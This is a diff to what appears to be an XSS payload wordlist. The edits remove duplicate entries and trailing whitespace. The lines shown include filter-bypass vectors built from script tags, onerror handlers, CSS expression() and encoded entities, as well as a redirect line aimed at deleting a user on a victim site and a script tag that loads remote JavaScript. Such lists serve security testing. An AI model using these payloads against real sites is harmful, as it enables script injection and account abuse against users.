@@ -4,8 +4,7 @@
 <script\x09type="text/javascript">javascript:alert(1);</script>
 <script\x0Ctype="text/javascript">javascript:alert(1);</script>
 <script\x2Ftype="text/javascript">javascript:alert(1);</script>
-<script\x0Atype="text/javascript">javascript:alert(1);</script>
-'`"><\x3Cscript>javascript:alert(1)</script>        
+'`"><\x3Cscript>javascript:alert(1)</script>
 '`"><\x00script>javascript:alert(1)</script>
 <img src=1 href=1 onerror="javascript:alert(1)"></img>
 <audio src=1 href=1 onerror="javascript:alert(1)"></audio>
@@ -107,8 +106,8 @@
 <style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
 <style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
 <style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
-"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
-"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF
 <script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
 <script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
 <script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
@@ -120,12 +119,6 @@
 <script src="data:\xD4\x8F,javascript:alert(1)"></script>
 <script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
 <script src="data:\xCB\x8F,javascript:alert(1)"></script>
-<script\x20type="text/javascript">javascript:alert(1);</script>
-<script\x3Etype="text/javascript">javascript:alert(1);</script>
-<script\x0Dtype="text/javascript">javascript:alert(1);</script>
-<script\x09type="text/javascript">javascript:alert(1);</script>
-<script\x0Ctype="text/javascript">javascript:alert(1);</script>
-<script\x2Ftype="text/javascript">javascript:alert(1);</script>
 <script\x0Atype="text/javascript">javascript:alert(1);</script>
 ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
 ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
@@ -568,7 +561,7 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
 <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
 <sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
-<img/src=`%00` onerror=this.onerror=confirm(1) 
+<img/src=`%00` onerror=this.onerror=confirm(1)
 <form><isindex formaction="javascript&colon;confirm(1)"
 <img src=`%00`&NewLine; onerror=alert(1)&NewLine;
 <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
